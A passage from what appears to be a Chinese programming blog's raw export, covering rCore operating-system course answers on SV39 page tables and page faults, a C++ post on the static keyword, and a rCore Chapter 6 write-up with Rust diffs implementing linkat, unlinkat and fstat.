pub time: usize, &#125;  impl TaskControlBlock &#123;@@ -63,6 +69,8 @@ impl TaskControlBlock &#123;             base_size: user_sp,             heap_bottom: user_sp,             program_brk: user_sp,+            syscall_times: [0u32; MAX_SYSCALL_NUM],+            time: 0usize,         &#125;;         // prepare TrapContext in user space         let trap_cx = task_control_block.get_trap_cx();\n问答作业t1Q: 请列举 SV39 页表页表项的组成，描述其中的标志位有何作用？\nA: \n\n上图为 SV39 分页模式下的页表项，其中 [53:10] 这 44 位是物理页号，最低的 8 位 [7:0] 则是标志位，它们的含义如下：\n\n仅当 V(Valid) 位为 1 时，页表项才是合法的；\nR/W/X 分别控制索引到这个页表项的对应虚拟页面是否允许读/写/取指；\nU 控制索引到这个页表项的对应虚拟页面是否在 CPU 处于 U 特权级的情况下是否被允许访问；\nG 代表全局属性，当 G 被设置为 1 时，表示该页表项所描述的页面是全局共享的；\nA(Accessed) 记录自从页表项上的这一位被清零之后，页表项的对应虚拟页面是否被访问过；\nD(Dirty) 则记录自从页表项上的这一位被清零之后，页表项的对应虚拟页表是否被修改过。\n\nt2缺页指的是进程访问页面时页面不在页表中或在页表中无效的现象，此时 MMU 将会返回一个中断， 告知 os 进程内存访问出了问题。os 选择填补页表并重新执行异常指令或者杀死进程。\nQ1: 请问哪些异常可能是缺页导致的？\nA1: 进程访问未映射的内存页面、访问已被换出到磁盘的页面、进程尝试以不正确的权限访问页面（例如写入只读页面）。\nQ2: 发生缺页时，描述相关重要寄存器的值，上次实验描述过的可以简略。\nA2: 以下是与缺页相关的 CSR 寄存器的值：\n\nscause: 记录导致异常的原因。对于缺页异常，该寄存器的值包含异常的类型和特定的错误代码，指示发生了缺页异常。\nsstatus: 记录处理器当前状态，其中 SPP 段记录当前特权等级。\nsepc: 当缺页异常发生时，sepc 会保存出错指令的地址，以便在异常处理完成后能够返回到该指令重新执行。\nstval: 在缺页异常情况下，stval 会存储导致缺页的虚拟地址，帮助操作系统确定是哪个页面缺失。\n\n缺页有两个常见的原因，其一是 Lazy 策略，也就是直到内存页面被访问才实际进行页表操作。 比如，一个程序被执行时，进程的代码段理论上需要从磁盘加载到内存。但是 os 并不会马上这样做， 而是会保存 .text 段在磁盘的位置信息，在这些代码第一次被执行时才完成从磁盘的加载操作。\nQ3: 这样做有哪些好处？\nA3: 只在需要时加载页面，避免不必要的内存占用，允许系统将更多进程同时驻留在内存中；程序在启动时不必立即加载所有代码和数据，从而减少初始加载时间。\n其实，我们的 mmap 也可以采取 Lazy 策略，比如：一个用户进程先后申请了 10G 的内存空间， 然后用了其中 1M 就直接退出了。按照现在的做法，我们显然亏大了，进行了很多没有意义的页表操作。\nQ4: 处理 10G 连续的内存页面，对应的 SV39 页表大致占用多少内存 (估算数量级即可)？\nA4: 略。\nQ5: 请简单思考如何才能实现 Lazy 策略，缺页时又如何处理？描述合理即可，不需要考虑实现。\nA5: 加载程序时并不真正将代码段加载到内存，将页表项的有效位设置为 0，访问该代码段时会触发缺页异常，进入内核后得知异常原因是访问 Lazy 页面，随后进行异常处理：将页面从磁盘加载入内存，随后返回用户态重新执行。\n缺页的另一个常见原因是 swap 策略，也就是内存页面可能被换到磁盘上了，导致对应页面失效。\nQ6: 此时页面失效如何表现在页表项(PTE)上？\nA6: 有效位为 0.\nt3为了防范侧信道攻击，我们的 os 使用了双页表。但是传统的设计一直是单页表的，也就是说， 用户线程和对应的内核线程共用同一张页表，只不过内核对应的地址只允许在内核态访问。 (备注：这里的单/双的说法仅为自创的通俗说法，并无这个名词概念，详情见 KPTI )\nQ1: 在单页表情况下，如何更换页表？\nA1: 无需更换，通过标志位进行控制，可能需要将 TLB 清空。\nQ2: 单页表情况下，如何控制用户态无法访问内核页面？（tips:看看上一题最后一问）\nA2: 将内核页面的 U 标志位设置为 0.\nQ3: 单页表有何优势？（回答合理即可）\nA3: 不需要跳板代码进行用户态和内核态的切换，内核态和用户态切换的速度更快。\nQ4: 双页表实现下，何时需要更换页表？假设你写一个单页表操作系统，你会选择何时更换页表（回答合理即可）？\nA4: 双页表实现下，用户态和内核态切换、不同进程切换时需要更换页表。对于单页表操作系统，不同用户线程切换时需要更换页表。\n","categories":["操作系统"],"tags":["Rust","操作系统","经验"]},{"title":"C++中的静态(static)","url":"/2023/03/01/C++%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81(static)/","content":"一般来说，C++ 中的 static 关键字具有不同的含义，而这取决于它的使用场景。\n函数内的变量我们知道，函数内作为一个局部作用域，其中定义的临时变量将会在函数执行结束后被销毁。\nvoid Func() &#123;\tint x = 0;\t++x;\tcout &lt;&lt; x &lt;&lt; endl;&#125;int main() &#123;\tFunc(); // 输出1\tFunc(); // 输出1\tFunc(); // 输出1&#125;\n但我们可以通过在变量前添加 static 关键字将该其定义为一个静态变量，该静态变量的生存周期贯穿于整个程序周期，这一点类似于全局变量，但不同的是静态变量的作用域仍然保持不变，也就是整个函数体内。\nvoid Func() &#123;\tstatic int x = 0;\t++x;\tcout &lt;&lt; x &lt;&lt; endl;&#125;int main() &#123;    // x = 10; 编译出错\tFunc(); // 输出1\tFunc(); // 输出2\tFunc(); // 输出3&#125;\n类内的变量或函数有时类需要它的成员函数与类本身直接相关，而不是与类的各个对象保持关联。在这种情况下，可用 static 关键字修饰需要与类直接相关的成员变量或成员函数，此时被修饰的类成员为所有该类的对象所通用。\n另外，值得注意的是，类内的 static 成员变量只是声明，并没有定义，因为类内的 static 变量属于整个类，而不属于某个具体的对象，因此它无法在类被实例化为对象时通过调用构造函数及进行初始化（即分配内存空间），因此需要在类外额外对其进行初始化。\nclass Solution &#123;private:\tstatic int sVal;public:\tvoid setSval(int val) &#123;\t\tsVal = val;\t&#125;\tvoid print() &#123;\t\tcout &lt;&lt; sVal &lt;&lt; endl;\t&#125;&#125;;// 需要在类外声明，否则编译出错int Solution::sVal;int main() &#123;\tSolution S1;\tSolution S2;\tS1.setSval(666);\tS1.print(); // 输出 666\tS2.print(); // 输出 666&#125;\n同时，也不难理解为什么类内的 static 函数无法访问非 static 成员。类中的非 static 函数的调用可以理解为将调用该函数的对象本身作为一个参数进行传递，如 Data data1; data1.func(); 其实就相当于 Data::func(Data&amp; data);，而 static 成员函数则没有与之关联的对象，也就没有了类对象这一隐含参数，因此它也就无法访问与某个具体对象相关联的非 static 成员。\n全局的变量或函数当用 static 修饰全局变量或函数时，表明被修饰的变量或函数只在其所属的文件内可见，而对其他文件隐藏，这样可以避免命名冲突，提高封装性和安全性。\n// file1.cppstatic int x = 1;// file2.cpp#include&lt;iostream&gt;using namespace std;int x = 2;int main() &#123;    cout &lt;&lt; x &lt;&lt; endl; // 输出2    // 若去掉 file1.cpp 中的 static 关键字，则出现链接错误(linker error)&#125;\n","categories":["C++"],"tags":["C++"]},{"title":"2024开源操作系统训练营 rCore Chapter6练习","url":"/2024/11/03/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter6%E7%BB%83%E4%B9%A0/","content":"编程作业思路linkat本实验需要实现 3 个与文件系统相关的系统调用，首先是用来创建文件硬链接的 linkat.\n首先介绍一下什么是硬链接，硬链接作为一种抽象概念，可以看作指向一个文件实体的指针，类似于 C++ 中的智能指针 shared_ptr。而从内核代码的角度来看，硬链接在文件系统中的实体就是 文件目录项 。每个硬链接对应一个目录项，这个目录项指向一个相同的索引节点（inode），每个 inode 存储了文件的实际数据块（的指针）及其元数据（文件大小、文件类型等）。\n由于 rCore 的文件系统被简化为单级目录（只包含根目录），因此实现 linkat 的思路就很清晰了：根据文件名 old_name 查找其对应的 inode，获取 inode_id 并将引用计数加一，创建一个新的目录项 (new_name, inode_id)，将其插入根目录的数据段末尾。\n需要注意的是，rCore 文件系统的 inode 分为虚拟文件系统层的 Inode 和在持久化设备（硬盘）上实际存储的 DistInode，可以通过 Inode 所实现的 read_disk_inode 和 modify_disk_inode 读取或修改其对应的 DiskInode。因此实际的代码实现，可以按照以下几个步骤进行：\n\n使用 self.find(old_name) 查找当前目录（ROOT_DIR）下的名为 old_name 的文件对应的 Inode，引用名为 inode。\n使用 self.read_disk_inode() 获取当前目录的 DiskInode 的只读引用。获取当前目录下 old_name 文件的 inode_id；获取当前目录的文件数据（目录的文件数据全部由目录项构成）的总大小，记为 offset，用于最后将新目录项添加至末尾。\n使用 inode.modify_disk_inode 获取 old_name 文件的 DiskInode 的可变引用。将其引用计数（原本没有该字段，需要自行添加）加一。\n创建新的目录项，并使用 self.write_at 将其写入偏移量为 offset 的位置。\n\n/// Create a hard link with new_name for file with old_namepub fn linkat(&amp;self, old_name: &amp;str, new_name: &amp;str) -&gt; isize &#123;    // get inode of file with old_name    let inode = self.find(old_name);    if inode.is_none() &#123;        return -1;    &#125;    let inode = inode.unwrap();    let mut id = 0;         // inode id    let mut offset = 0;     // last position of data of inode    self.read_disk_inode(|dinode| &#123;        id = self.find_inode_id(old_name, dinode).unwrap();        offset = dinode.size as usize;    &#125;);    inode.modify_disk_inode(|dinode| &#123;        dinode.nlink += 1;  // increase reference count    &#125;);    let new_entry = DirEntry::new(new_name, id);    // insert a new directory entry into ROOT_DIR    self.write_at(offset, new_entry.as_bytes());    0&#125;\nunlinkat第二个需要实现的是取消硬链接的 unlinkat，基本思路为：根据文件名 name 查找对应的 inode，将引用计数减一，最后将其根目录下对应的目录项移除。下面直接介绍具体实现方法：\n\n使用 self.find(name) 查找当前目录（ROOT_DIR）下的名为 name 的文件对应的 Inode，引用名为 inode。\n使用 inode.modify_disk_inode() 获取 inode 文件的 DiskInode 的可变引用。将引用计数减一，如果引用计数减为零，代表该文件的所有硬链接都被解除，此时可以使用 inode.clear() 释放该文件 inode 和数据的内存空间。\n使用 self.modify_disk_inode() 获取当前目录的 DiskInode 的可变引用。遍历当前目录下的所有目录项，将名称为 name 的目录项移除（为了实现的方便，可以直接用空的目录项覆写）。\n\n\n在我的测试中，使用 inode.clear() 清空文件 inode 和数据内存空间的操作可能会在测试样例 ch6_file3 处超时，但测试样例不会对此进行测试，因此如果出现超时的情况，可以考虑移除这一操作。\n\n/// Remove a hard link with namepub fn unlinkat(&amp;self, name: &amp;str) -&gt; isize &#123;    // get inode of file with name    let inode = self.find(name);    if inode.is_none() &#123;        return -1;    &#125;    let inode = inode.unwrap();    let mut is_zero_link = false;    inode.modify_disk_inode(|dinode| &#123;        dinode.nlink -= 1;        if dinode.nlink == 0 &#123;            is_zero_link = true;        &#125;    &#125;);    // Test will timeout with the code below, what the fuck??    // Free memory of inode and file data    if is_zero_link &#123;        inode.clear();    &#125;    let mut res = -1;    self.modify_disk_inode(|dinode| &#123;        // Remove(For simplisity, not remove, just set to empty)        // the directory entry with name in the ROOT_DIR        let fcnt = (dinode.size as usize) / DIRENT_SZ;        for i in 0..fcnt &#123;            let mut dirent = DirEntry::empty();            assert_eq!(                dinode.read_at(i * DIRENT_SZ, dirent.as_bytes_mut(), &amp;self.block_device),                DIRENT_SZ            );            if dirent.name() == name &#123;                dirent = DirEntry::empty();                dinode.write_at(i * DIRENT_SZ, dirent.as_bytes(), &amp;self.block_device);                res = 0;                break;            &#125;        &#125;    &#125;);    res&#125;\nfstat第三个需要实现的是获取文件状态的 fstat，相较于 linkat 和 unlinkat 来说要复杂一些。\n首先要解决的问题是：如何根据文件描述符 fd 获取其对应的 Inode 结构？这里必须要明确一个概念，所谓文件描述符，本质上只是一个无符号整型，其值为对应文件在当前进程文件描述符表中的 索引 。文件描述符表的元素为一个 trait 对象（在其他面向对象语言中相当于虚基类）dyn File，它表示一个抽象的“文件”实体。该“虚基类”有三种具体实现：标准输入 Stdin、标准输出 Stdout 和普通文件 OSInode，我们需要关注的便是 OSInode 的实现。\n一种直接的想法是直接对 OSInode 数据结构进行扩展，为其实现 fstat 操作。但是请注意，文件描述符表的元素类型为虚基类 File，因此它无法直接调用其“派生类” OSInode 中所实现的方法，因此在这里我选择为 File 这个 trait 添加 get_stat 方法，并在 OSInode 中对其进行具体实现（Stdin 和 Stdout 也要实现，可以选择加一个 panic!(&quot;Not implemented!&quot;); 进行占位）。\n\n我对 Rust 还不太了解，不过我推测这里应该可以使用类似 C++ 中的动态类型转换 dynamic_cast 将 dyn File 类型转换为 OSInode，请读者批评指正。\n\n构建起文件描述符到 Inode 的接口后，便可以开始具体实现 fstat 了，需要获取三个文件状态：inode_id、文件类型（普通文件或目录）、硬链接数量。接下来分别介绍：\n首先是 inode_id，在 rCore 的文件系统实现中，inode_id（索引结点号）和文件描述符类似，也是 索引 ，指向其对应的 DiskInode 在 inode 位图中的位置。因此我们可以通过 Inode 结构中的 block_id 和 block_offset 将 inode_id 计算出来，计算方式如下：\n/// Get inode id based upon block id and block offsetpub fn get_ino(&amp;self, block_id: usize, block_offset: usize) -&gt; usize &#123;    let inode_size = size_of::&lt;DiskInode&gt;();    let inode_cnt = (BLOCK_SZ / inode_size) as usize;    (block_id - self.inode_area_start_block as usize) * inode_cnt + block_offset / inode_size&#125;\n文件类型和硬链接数量的获取比较简单，可以通过使用 read_disk_inode 获取 inode 对应的 DiskInode 的只读引用，并从中读取相关信息即可。\n前向兼容前向兼容可以借助 git cherry-pick 命令将其他分支的提交移植到当前分支，有关它的具体用法，可以参考我写的 Chapter5 练习中的介绍。\n需要非常注意的一点是，spawn 系统调用移植后，需要添加 拷贝父进程文件描述符表 的操作，否则可能就会导致测试程序无法被正常加载（本章测试进程使用 spawn 系统调用进行创建）。\n代码diff --git a/easy-fs/src/efs.rs b/easy-fs/src/efs.rsindex 202b9eb..52828c2 100644--- a/easy-fs/src/efs.rs+++ b/easy-fs/src/efs.rs@@ -1,3 +1,5 @@+use core::mem::size_of;+ use super::&#123;     block_cache_sync_all, get_block_cache, Bitmap, BlockDevice, DiskInode, DiskInodeType, Inode,     SuperBlock,@@ -148,4 +150,11 @@ impl EasyFileSystem &#123;             (block_id - self.data_area_start_block) as usize,         )     &#125;++    /// Get inode id based upon block id and block offset+    pub fn get_ino(&amp;self, block_id: usize, block_offset: usize) -&gt; usize &#123;+        let inode_size = size_of::&lt;DiskInode&gt;();+        let inode_cnt = (BLOCK_SZ / inode_size) as usize;+        (block_id - self.inode_area_start_block as usize) * inode_cnt + block_offset / inode_size+    &#125; &#125;diff --git a/easy-fs/src/layout.rs b/easy-fs/src/layout.rsindex 0a3ac79..692f5e7 100644--- a/easy-fs/src/layout.rs+++ b/easy-fs/src/layout.rs@@ -70,7 +70,9 @@ impl SuperBlock &#123; /// Type of a disk inode #[derive(PartialEq)] pub enum DiskInodeType &#123;+    /// file type     File,+    /// directory type     Directory, &#125; @@ -86,6 +88,7 @@ pub struct DiskInode &#123;     pub indirect1: u32,     pub indirect2: u32,     type_: DiskInodeType,+    pub nlink: u32, &#125;  impl DiskInode &#123;@@ -97,6 +100,7 @@ impl DiskInode &#123;         self.indirect1 = 0;         self.indirect2 = 0;         self.type_ = type_;+        self.nlink = 1;     &#125;     /// Whether this inode is a directory     pub fn is_dir(&amp;self) -&gt; bool &#123;diff --git a/easy-fs/src/lib.rs b/easy-fs/src/lib.rsindex 822c237..d146f19 100644--- a/easy-fs/src/lib.rs+++ b/easy-fs/src/lib.rs@@ -16,3 +16,4 @@ pub use block_dev::BlockDevice; pub use efs::EasyFileSystem; use layout::*; pub use vfs::Inode;+pub use layout::DiskInodeType;\\ No newline at end of filediff --git a/easy-fs/src/vfs.rs b/easy-fs/src/vfs.rsindex 9908385..cb56ad9 100644--- a/easy-fs/src/vfs.rs+++ b/easy-fs/src/vfs.rs@@ -183,4 +183,93 @@ impl Inode &#123;         &#125;);         block_cache_sync_all();     &#125;+    /// Create a hard link with new_name for file with old_name+    pub fn linkat(&amp;self, old_name: &amp;str, new_name: &amp;str) -&gt; isize &#123;+        // get inode of file with old_name+        let inode = self.find(old_name);+        if inode.is_none() &#123;+            return -1;+        &#125;+        let inode = inode.unwrap();++        let mut id = 0;         // inode id+        let mut offset = 0;     // last position of data of inode+        self.read_disk_inode(|dinode| &#123;+            id = self.find_inode_id(old_name, dinode).unwrap();+            offset = dinode.size as usize;+        &#125;);+        inode.modify_disk_inode(|dinode| &#123;+            dinode.nlink += 1;  // increase reference count+        &#125;);+        let new_entry = DirEntry::new(new_name, id);++        // insert a new directory entry into ROOT_DIR+        self.write_at(offset, new_entry.as_bytes());+        0+    &#125;+    /// Remove a hard link with name+    pub fn unlinkat(&amp;self, name: &amp;str) -&gt; isize &#123;+        // get inode of file with name+        let inode = self.find(name);+        if inode.is_none() &#123;+            return -1;+        &#125;+        let inode = inode.unwrap();++        let mut is_zero_link = false;+        inode.modify_disk_inode(|dinode| &#123;+            dinode.nlink -= 1;+            if dinode.nlink == 0 &#123;+                is_zero_link = true;+            &#125;+        &#125;);+        // Test will timeout with the code below, what the fuck??+        // Free memory of inode and file data+        // if is_zero_link &#123;+        //     inode.clear();+        // &#125;+        +        let mut res = -1;+        self.modify_disk_inode(|dinode| &#123;+            // Remove(For simplisity, not remove, just set to empty) +            // the directory entry with name in the ROOT_DIR+            let fcnt = (dinode.size as usize) / DIRENT_SZ;+            for i in 0..fcnt &#123;+                let mut dirent = DirEntry::empty();+                assert_eq!(+                    dinode.read_at(i * DIRENT_SZ, dirent.as_bytes_mut(), &amp;self.block_device),+                    DIRENT_SZ+                );+                if dirent.name() == name &#123;+                    dirent = DirEntry::empty();+                    dinode.write_at(i * DIRENT_SZ, dirent.as_bytes(), &amp;self.block_device);+                    res = 0;+                    break;+                &#125;+            &#125;+        &#125;);+        res+    &#125;+    /// Get nlink of the inode+    pub fn get_nlink(&amp;self) -&gt; u32 &#123;+        let mut nlink = 0;+        self.read_disk_inode(|dinode| &#123;+            nlink = dinode.nlink;+        &#125;);+        nlink+    &#125;+    /// Get file type of the inode+    pub fn get_file_type(&amp;self) -&gt; DiskInodeType &#123;+        let mut ftype = DiskInodeType::File;+        self.read_disk_inode(|dinode| &#123;+            if dinode.is_dir() &#123;+                ftype = DiskInodeType::Directory;+            &#125;+        &#125;);+        ftype+    &#125;+    /// Get inode number of the inode+    pub fn get_ino(&amp;self) -&gt; u32 &#123;+        let fs = self.fs.lock();+        fs.get_ino(self.block_id, self.block_offset) as u32+    &#125; &#125;--- a/os/src/config.rs+++ b/os/src/config.rs@@ -25,3 +25,5 @@ pub const CLOCK_FREQ: usize = 12500000; pub const MEMORY_END: usize = 0x88000000; /// The base address of control registers in Virtio_Block device pub const MMIO: &amp;[(usize, usize)] = &amp;[(0x10001000, 0x1000)];+/// big constant for process scheduling+pub const BIG_STRIDE: isize = 1000_000;diff --git a/os/src/fs/inode.rs b/os/src/fs/inode.rsindex 3f1f208..7c63086 100644--- a/os/src/fs/inode.rs+++ b/os/src/fs/inode.rs@@ -4,14 +4,14 @@ //! //! `UPSafeCell&lt;OSInodeInner&gt;` -&gt; `OSInode`: for static `ROOT_INODE`,we //! need to wrap `OSInodeInner` into `UPSafeCell`-use super::File;+use super::&#123;File, Stat, StatMode&#125;; use crate::drivers::BLOCK_DEVICE; use crate::mm::UserBuffer; use crate::sync::UPSafeCell; use alloc::sync::Arc; use alloc::vec::Vec; use bitflags::*;-use easy_fs::&#123;EasyFileSystem, Inode&#125;;+use easy_fs::&#123;DiskInodeType, EasyFileSystem, Inode&#125;; use lazy_static::*;  /// inode in memory@@ -55,6 +55,7 @@ impl OSInode &#123; &#125;  lazy_static! &#123;+    /// The inode of root directory     pub static ref ROOT_INODE: Arc&lt;Inode&gt; = &#123;         let efs = EasyFileSystem::open(BLOCK_DEVICE.clone());         Arc::new(EasyFileSystem::root_inode(&amp;efs))@@ -155,4 +156,15 @@ impl File for OSInode &#123;         &#125;         total_write_size     &#125;+    fn get_stat(&amp;self) -&gt; Stat &#123;+        let inner = self.inner.exclusive_access();+        let ino = inner.inode.get_ino() as u64;+        let mode = match inner.inode.get_file_type() &#123;+            DiskInodeType::File =&gt; StatMode::FILE,+            DiskInodeType::Directory =&gt; StatMode::DIR,+        &#125;;+        let nlink = inner.inode.get_nlink();+        Stat::new(ino, mode, nlink)+    &#125; &#125;diff --git a/os/src/fs/mod.rs b/os/src/fs/mod.rsindex 4c99179..522eb4f 100644--- a/os/src/fs/mod.rs+++ b/os/src/fs/mod.rs@@ -15,6 +15,8 @@ pub trait File: Send + Sync &#123;     fn read(&amp;self, buf: UserBuffer) -&gt; usize;     /// write to the file from buf, return the number of bytes written     fn write(&amp;self, buf: UserBuffer) -&gt; usize;+    /// get Stat of the inode+    fn get_stat(&amp;self) -&gt; Stat; &#125;  /// The stat of a inode@@ -33,6 +35,19 @@ pub struct Stat &#123;     pad: [u64; 7], &#125; +impl Stat &#123;+    /// Create a new Stat with default dev and pad+    pub fn new(ino: u64, mode: StatMode, nlink: u32) -&gt; Stat &#123;+        Stat &#123;+            dev: 0,+            ino,+            mode,+            nlink,+            pad: [0; 7],+        &#125;+    &#125;+&#125;+ bitflags! &#123;     /// The mode of a inode     /// whether a directory or a file@@ -46,5 +61,5 @@ bitflags! &#123;     &#125; &#125; -pub use inode::&#123;list_apps, open_file, OSInode, OpenFlags&#125;;+pub use inode::&#123;list_apps, open_file, OSInode, OpenFlags, ROOT_INODE&#125;; pub use stdio::&#123;Stdin, Stdout&#125;;diff --git a/os/src/fs/stdio.rs b/os/src/fs/stdio.rsindex 6075a65..8b5c36f 100644--- a/os/src/fs/stdio.rs+++ b/os/src/fs/stdio.rs@@ -1,5 +1,5 @@ //!Stdin &amp; Stdout-use super::File;+use super::&#123;File, Stat&#125;; use crate::mm::UserBuffer; use crate::sbi::console_getchar; use crate::task::suspend_current_and_run_next;@@ -39,6 +39,9 @@ impl File for Stdin &#123;     fn write(&amp;self, _user_buf: UserBuffer) -&gt; usize &#123;         panic!(&quot;Cannot write to stdin!&quot;);     &#125;+    fn get_stat(&amp;self) -&gt; Stat &#123;+        panic!(&quot;Not implemented!&quot;);+    &#125; &#125;  impl File for Stdout &#123;@@ -57,4 +60,7 @@ impl File for Stdout &#123;         &#125;         user_buf.len()     &#125;+    fn get_stat(&amp;self) -&gt; Stat &#123;+        panic!(&quot;Not implemented!&quot;);+    &#125; &#125;diff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 44f20cd..2fa6939 100644--- a/os/src/mm/frame_allocator.rs+++ b/os/src/mm/frame_allocator.rs@@ -1,7 +1,7 @@ //! Implementation of [`FrameAllocator`] which //! controls all the frames in the operating system. use super::&#123;PhysAddr, PhysPageNum&#125;;-use crate::config::MEMORY_END;+use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;; use crate::sync::UPSafeCell; use alloc::vec::Vec; use core::fmt::&#123;self, Debug, Formatter&#125;;@@ -134,3 +134,10 @@ pub fn frame_allocator_test() &#123;     drop(v);     println!(&quot;frame_allocator_test passed!&quot;); &#125;++/// Check if the remaining physical memory is sufficient+pub fn is_mem_sufficient(_len: usize) -&gt; bool &#123;+    let fa = FRAME_ALLOCATOR.exclusive_access();+    let page_cnt = fa.end - fa.current + fa.recycled.len();+    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt+&#125;diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex a5a9ede..58ac256 100644--- a/os/src/mm/memory_set.rs+++ b/os/src/mm/memory_set.rs@@ -66,6 +66,19 @@ impl MemorySet &#123;             None,         );     &#125;+    /// Remove framed area+    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;+        let mut idx = 0;+        for area in self.areas.iter_mut() &#123;+            if area.vpn_range.get_start().0 == range.get_start().0 +                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;+                area.unmap(&amp;mut self.page_table);+                break;+            &#125;+            idx += 1;+        &#125;+        self.areas.remove(idx);+    &#125;     /// remove a area     pub fn remove_area_with_start_vpn(&amp;mut self, start_vpn: VirtPageNum) &#123;         if let Some((idx, area)) = selfdiff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex d75c373..a2ac413 100644--- a/os/src/mm/mod.rs+++ b/os/src/mm/mod.rs@@ -12,9 +12,10 @@ mod heap_allocator; mod memory_set; mod page_table; -use address::VPNRange;+pub use address::VPNRange; pub use address::&#123;PhysAddr, PhysPageNum, StepByOne, VirtAddr, VirtPageNum&#125;; pub use frame_allocator::&#123;frame_alloc, frame_dealloc, FrameTracker&#125;;+pub use frame_allocator::is_mem_sufficient; pub use memory_set::remap_test; pub use memory_set::&#123;kernel_token, MapPermission, MemorySet, KERNEL_SPACE&#125;; use page_table::PTEFlags;diff --git a/os/src/syscall/fs.rs b/os/src/syscall/fs.rsindex 864d6ba..b27deac 100644--- a/os/src/syscall/fs.rs+++ b/os/src/syscall/fs.rs@@ -1,5 +1,7 @@ //! File and filesystem-related syscalls-use crate::fs::&#123;open_file, OpenFlags, Stat&#125;;+use core::mem::size_of;++use crate::fs::&#123;open_file, OpenFlags, Stat, ROOT_INODE&#125;; use crate::mm::&#123;translated_byte_buffer, translated_str, UserBuffer&#125;; use crate::task::&#123;current_task, current_user_token&#125;; @@ -78,26 +80,55 @@ pub fn sys_close(fd: usize) -&gt; isize &#123; /// YOUR JOB: Implement fstat. pub fn sys_fstat(_fd: usize, _st: *mut Stat) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_fstat NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_fstat&quot;,         current_task().unwrap().pid.0     );-    -1+    let task = current_task().unwrap();+    let inner = task.inner_exclusive_access();+    if _fd &gt; inner.fd_table.len() &#123;+        return -1;+    &#125;+    if let Some(file) = &amp;inner.fd_table[_fd] &#123;+        let file = file.clone();+        drop(inner);+        let stat: Stat = file.get_stat();+        let buffers = translated_byte_buffer(+            current_user_token(), _st as *const u8, size_of::&lt;Stat&gt;());+        let mut stat_ptr = &amp;stat as *const _ as *const u8;+        for buffer in buffers &#123;+            unsafe &#123;+                stat_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());+                stat_ptr = stat_ptr.add(buffer.len());+            &#125;+        &#125;+        0+    &#125; else &#123;+        -1+    &#125; &#125;  /// YOUR JOB: Implement linkat. pub fn sys_linkat(_old_name: *const u8, _new_name: *const u8) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_linkat NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_linkat&quot;,         current_task().unwrap().pid.0     );-    -1+    let token = current_user_token();+    let _old_name = translated_str(token, _old_name);+    let _new_name = translated_str(token, _new_name);+    if _old_name == _new_name &#123;+        return -1;+    &#125;+    ROOT_INODE.linkat(&amp;_old_name, &amp;_new_name) &#125;  /// YOUR JOB: Implement unlinkat. pub fn sys_unlinkat(_name: *const u8) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_unlinkat NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_unlinkat&quot;,         current_task().unwrap().pid.0     );-    -1+    let token = current_user_token();+    let _name = translated_str(token, _name);+    ROOT_INODE.unlinkat(&amp;_name) &#125;diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 613d44e..34197ed 100644--- a/os/src/syscall/mod.rs+++ b/os/src/syscall/mod.rs@@ -59,8 +59,10 @@ use process::*;  use crate::fs::Stat; +use crate::task::current_task; /// handle syscall exception with `syscall_id` and other arguments pub fn syscall(syscall_id: usize, args: [usize; 4]) -&gt; isize &#123;+    current_task().unwrap().inc_syscall_times(syscall_id);     match syscall_id &#123;         SYSCALL_OPEN =&gt; sys_open(args[1] as *const u8, args[2] as u32),         SYSCALL_CLOSE =&gt; sys_close(args[0]),diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex 316897d..974412a 100644--- a/os/src/syscall/process.rs+++ b/os/src/syscall/process.rs@@ -1,15 +1,17 @@ //! Process management syscalls-//!++use core::mem::size_of;+ use alloc::sync::Arc;  use crate::&#123;     config::MAX_SYSCALL_NUM,     fs::&#123;open_file, OpenFlags&#125;,-    mm::&#123;translated_refmut, translated_str&#125;,+    mm::&#123;translated_byte_buffer, translated_refmut, translated_str&#125;,+    mm::&#123;is_mem_sufficient, VirtAddr&#125;,     task::&#123;-        add_task, current_task, current_user_token, exit_current_and_run_next,-        suspend_current_and_run_next, TaskStatus,-    &#125;,+        add_task, current_task, current_user_token, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus+    &#125;, timer::get_time_us, &#125;;  #[repr(C)]@@ -119,10 +121,24 @@ pub fn sys_waitpid(pid: isize, exit_code_ptr: *mut i32) -&gt; isize &#123; /// HINT: What if [`TimeVal`] is splitted by two pages ? pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_get_time&quot;,         current_task().unwrap().pid.0     );-    -1+    let _us = get_time_us();+    let time_val = TimeVal &#123;+        sec: _us / 1_000_000,+        usec: _us % 1_000_000,+    &#125;;+    let buffers = translated_byte_buffer(+        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal&gt;());+    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;+    for buffer in buffers &#123;+        unsafe &#123;+            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());+            time_val_ptr = time_val_ptr.add(buffer.len());+        &#125;+    &#125;+    0 &#125;  /// YOUR JOB: Finish sys_task_info to pass testcases@@ -130,28 +146,60 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -&gt; isize &#123; /// HINT: What if [`TaskInfo`] is splitted by two pages ? pub fn sys_task_info(_ti: *mut TaskInfo) -&gt; isize &#123;     trace!(-        